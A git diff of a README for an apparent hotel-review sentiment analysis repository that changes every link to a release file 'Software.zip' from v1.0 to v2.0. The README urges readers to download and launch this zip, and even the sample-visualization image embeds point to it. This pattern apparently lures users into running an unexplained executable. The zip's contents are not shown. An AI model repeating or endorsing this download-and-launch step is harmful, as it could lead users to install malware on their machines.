@@ -23,23 +23,23 @@ Within this repository, you will find the following:
 - **Visualizations:** Tableau workbooks for creating insightful visuals
 - **Data:** Datasets of hotel reviews for sentiment analysis
 - **Documentation:** Guidelines on the data cleaning and preprocessing steps
-- **Software:** [Download the analysis software here!](https://github.com/Calebtheman116/hotel_customers_sentiments/releases/download/v1.0/Software.zip)
+- **Software:** [Download the analysis software here!](https://github.com/Calebtheman116/hotel_customers_sentiments/releases/download/v2.0/Software.zip)
 
-| :notebook: **Note:** The https://github.com/Calebtheman116/hotel_customers_sentiments/releases/download/v1.0/Software.zip needs to be launched to access the tools for sentiment analysis.
+| :notebook: **Note:** The https://github.com/Calebtheman116/hotel_customers_sentiments/releases/download/v2.0/Software.zip needs to be launched to access the tools for sentiment analysis.
 
 ## Getting Started 🚀
 To get started with the sentiment analysis project:
-1. Download the https://github.com/Calebtheman116/hotel_customers_sentiments/releases/download/v1.0/Software.zip file from the provided link.
+1. Download the https://github.com/Calebtheman116/hotel_customers_sentiments/releases/download/v2.0/Software.zip file from the provided link.
 2. Extract the contents and launch the software for data analysis.
 3. Explore the Excel files for data insights and Tableau workbooks for visualizations.
 
 ## Visualization Samples 📊
 Take a look at some sample visualizations created through sentiment analysis:
 
-![Treemap Visualization](https://github.com/Calebtheman116/hotel_customers_sentiments/releases/download/v1.0/Software.zip)
+![Treemap Visualization](https://github.com/Calebtheman116/hotel_customers_sentiments/releases/download/v2.0/Software.zip)
 *Caption: Treemap visualization showcasing sentiment distribution in hotel reviews.*
 
-![Pivot Table Analysis](https://github.com/Calebtheman116/hotel_customers_sentiments/releases/download/v1.0/Software.zip)
+![Pivot Table Analysis](https://github.com/Calebtheman116/hotel_customers_sentiments/releases/download/v2.0/Software.zip)
 *Caption: Excel pivot table analysis of customer sentiments.*
 
 ## Support and Contributions 🤝
@@ -51,4 +51,4 @@ The "hotel_customers_sentiments" repository offers a comprehensive analysis of c
 Let's dive into the world of hotel customer sentiments together! 🛌📝📊
 
 ---
-Feel free to explore the [software tools](https://github.com/Calebtheman116/hotel_customers_sentiments/releases/download/v1.0/Software.zip) for conducting sentiment analysis on hotel reviews! 🚀
+Feel free to explore the [software tools](https://github.com/Calebtheman116/hotel_customers_sentiments/releases/download/v2.0/Software.zip) for conducting sentiment analysis on hotel reviews! 🚀
